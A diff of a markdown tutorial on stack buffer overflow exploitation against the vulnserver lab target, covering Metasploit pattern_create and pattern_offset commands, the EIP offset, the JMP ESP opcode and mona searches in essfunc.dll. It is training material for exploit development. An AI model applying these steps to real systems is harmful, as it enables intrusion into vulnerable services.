@@ -87,21 +87,21 @@ We need to identify what information is stored in each register at the crash mom
 
 Identify the exact size of the buffer where the program crashes by creating an special string with metasploit framework pattern\_create (locate pattern\_create). In my case I had to run it in this way:
 
-           /opt/metasploit\-framework/embedded/bin/ruby /opt/metasploit-framework/embedded/framework/tools/exploit/pattern\_create.rb -l 5000
+           /opt/metasploit-framework/embedded/bin/ruby /opt/metasploit-framework/embedded/framework/tools/exploit/pattern_create.rb -l 5000
            In other Kali: 
-           msf-pattern\_create -l \[LENGHT\]
-           \#This can also be generated using mona.py in Immunity Debugger but I will not show here the details.
-           \#This can be done in x64dbg by running  ERC --pattern c 5000
+           msf-pattern_create -l [LENGHT]
+           #This can also be generated using mona.py in Immunity Debugger but I will not show here the details.
+           #This can be done in x64dbg by running  ERC --pattern c 5000
            #Phase 3 of the python script help us to identify this task.
 
 Restart the vulnserver in windows from the debugger (ctrl-F2) and run the python script Phase 2 using the pattern we got. Once the server crash, check the value in the registers (right side in immunity), specially the EIP value. In this case it is **386F4337**
 
 Calculate the offset for this EIP value using
 
-           /opt/metasploit\-framework/embedded/bin/ruby /opt/metasploit-framework/embedded/framework/tools/exploit/pattern\_offset.rb -l \[length\] -q **386F4337**
-           \#In other kali: msf-pattern\_offset -l \[length\] -q 386F4337
-           \=> \[\*\] Exact match at offset 2003
-           \# In ERC the command ERC --pattern o 8oC7 #In python b"\x38\x6F\x43\x37" to get 8oC7
+           /opt/metasploit-framework/embedded/bin/ruby /opt/metasploit-framework/embedded/framework/tools/exploit/pattern_offset.rb -l [length] -q **386F4337**
+           #In other kali: msf-pattern\_offset -l [length] -q 386F4337
+           => [*] Exact match at offset 2003
+           # In ERC the command ERC --pattern o 8oC7 #In python b"\x38\x6F\x43\x37" to get 8oC7
 
 Confirm the EIP can be manipulated by us:
 
@@ -133,13 +133,14 @@ To run mona, in Immunity Debugger run the command in the textbox in the downside
 
            !mona modules #In this case essfunc.dll is found or
            ERC --ModuleInfo  #using x64dbg with the ERC pluggin
-           \# Identify which modules have less protections active from the process running.
-           \# To know the op codefor JUMP ESP we can use msf-nasm\_shell. Run it and put JMP ESP to identify the op code
-           msf-nasm\_shell
-           \>JMP ESP
-           \#In other Kali is: /opt/metasploit\-framework/embedded/bin/ruby /opt/metasploit-framework/embedded/framework/tools/exploit/nasm\_shell.rb
-           \#We got "FFE4"
-           \# Now we need to look for the instruction JMP ESP ("\\xff\\xe4") in the memory for any of these unprotected modules
+           # Identify which modules have less protections active from the process running.
+           # To know the op codefor JUMP ESP we can use msf-nasm\_shell. Run it and put JMP ESP to identify the op code
+           msf-nasm_shell
+           >JMP ESP
+           #In other Kali is: /opt/metasploit-framework/embedded/bin/ruby /opt/metasploit-framework/embedded/framework/tools/exploit/nasm_shell.rb
+           #We got "FFE4"
+           # Now we need to look for the instruction JMP ESP ("\\xff\\xe4") in the memory for any of these unprotected module
+           # The easiest way is running: # !mona jmp -r esp -cpb "\x00\x0A"   #badchars
            !mona find -s "\\xff\\xe4" -m "essfunc.dll" => -s is the byte string to search for, -m specifies the module to search in
            \#9 occurrences were found.
            #In x64dbg, go to symbols (alt+e), select any of the dll or exe files by double clicking it. Then ctrl+f to search and jmp esp
